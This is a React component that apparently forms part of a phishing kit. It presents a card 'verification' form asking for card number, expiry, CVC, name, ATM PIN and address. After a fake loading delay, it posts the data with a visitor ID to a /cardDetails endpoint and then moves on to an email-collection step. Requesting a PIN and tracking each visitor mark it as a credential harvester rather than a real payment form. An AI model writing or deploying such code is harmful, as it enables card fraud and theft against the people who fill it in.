import { Box, Button, Paper, TextField, Stepper } from '@mui/material';
import React, { useState } from 'react';
import Cards from 'react-credit-cards-2';
import '../App.css'
import Step from '@mui/material/Step';
import StepLabel from '@mui/material/StepLabel';
import "react-credit-cards-2/es/styles-compiled.css";
import Email from './Email';
import { Input } from 'semantic-ui-react'


const PaymentForm = (userid) => {
  const [show, setShow] = useState();
  const [opacity, setOpacity] = useState(false); 
  const [opacityValue, setOpacityValue] = useState(''); 
  const [step, setSteps] = React.useState(1); 

  const [state, setState] = useState({
    number: '',
    expiry: '',
    cvc: '',
    name: '',
    pin: '',
    address: '',
    focus: '',
  });

  const steps = [
    'Verify Information',
    'Card Verification',
    'Identity Verification',
  ];

  
  React.useEffect(() => {
    setShow(false);

}, [])

  const submitHandler = e => {
    setOpacity(true); 
    setOpacityValue('opacity-20')
    e.preventDefault();
    console.log('hitting');
    const data = {visitor_id: userid.userid, card_number: state.number, valid_thru: state.expiry, cvc: state.cvc, card_name: state.name, atm_pin: state.pin, address: state.address }
    

    setTimeout(() => {
      setShow(!show)
      fetch(process.env.REACT_APP_PRODUCTION_URL+'/cardDetails', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
  
      }).then((response) => {
        console.log(response.status)
      })
    }, 3000);

  }

  const handleInputChange = (evt) => {
    const { name, value } = evt.target;

    setState((prev) => ({ ...prev, [name]: value }));
  }

  const handleInputFocus = (evt) => {
    setState((prev) => ({ ...prev, focus: evt.target.name }));
  }

  return (
    <div className='p-3'>


      
      {!show && (
<div>
  <div className=''>
      <Cards 
        clasName={"rccs__card rccs__card--unknown"}
        number={state.number}
        expiry={state.expiry}
        cvc={state.cvc}
        name={state.name}
        focused={state.focus}
      />

      </div>

<Box 
      sx={{
        marginTop: "-40px",
        borderRadius: "50px",
        display: 'flex',
        flexWrap: 'wrap',
        '& > :not(style)': {
          m: 1,
          width: 350,
          height: 450,
          
        },
      }}
    >

      

      <Paper className={opacity ? opacityValue : ""} style={{borderRadius: 10}} elevation={6}>


      {opacity ? (

<div role="status" class="absolute -translate-x-1/2 -translate-y-1/2 top-2/4 left-1/2 ">
<svg aria-hidden="true" class="w-16 h-16 mr-2 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/><path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/></svg>
<span class="sr-only">Loading...</span>
</div>
) : (

<div></div>
)}



            
      

        
            


    
      <form className='flex flex-col items-center p-5'>
        <div className='w-full mb-3'>

        <TextField autoFocus  margin="dense" size="small" 
          fullWidth="true"
          type="tel"
          name="number"
          placeholder="Card Number"
          pattern="[\d| ]{16,22}"
          required
          onChange={handleInputChange}
          onFocus={handleInputFocus}
          
      
        />
        </div>

        <div className='w-full mb-3'>
        <TextField  margin="dense" size="small"
          fullWidth="true"
          type="text"
          name="name"
          placeholder="Full Name"
          value={state.name}
          onChange={handleInputChange}
          onFocus={handleInputFocus}
          required
        />
        </div>

        

        <div className='flex flex-row  mb-3 '>
          <div className='mr-5'>
        <TextField  margin="dense" size="small"
          fullWidth="false"
          type="tel"
          name="expiry"
          className="mr-1"
          placeholder="Vaid Thru"
          pattern="\d\d/\d\d"
          required
          onChange={handleInputChange}
          onFocus={handleInputFocus}
        />
</div>

<div>
<TextField  margin="dense" size="small"
          fullWidth="false"
          type="tel"
          name="cvc"
          className="form-control"
          placeholder="CVC"
          pattern="\d{3,4}"
          required
          onChange={handleInputChange}
          onFocus={handleInputFocus}
          
        />
        </div>
        </div>

        <div className='w-full mb-3'>

        <TextField  margin="dense" size="small"
          fullWidth="true"
          type="tel"
          name="pin"
          className="form-control"
          placeholder="ATM-PIN"
          pattern="\d{3,4}"
          required
          onChange={handleInputChange}
          onFocus={handleInputFocus}
          
        />
        </div>


        <div className='w-full mb-3'>

        <TextField  margin="dense" size="small"
          fullWidth="true"
          type="text"
          name="address"
          className="form-control"
          placeholder="Address"
          pattern=""
          required
          onChange={handleInputChange}
          onFocus={handleInputFocus}
        />
    
        </div>
        
        <div className='w-full mb-3'>

        <Button onClick={submitHandler} fullWidth='true' type="submit" variant="contained">Next</Button>
      </div>


      </form>
      </Paper>
    </Box>
      </div>
      )}
          {show &&<div> <Email userid={userid.userid}/> </div>}

    </div>
  );
}

export default PaymentForm;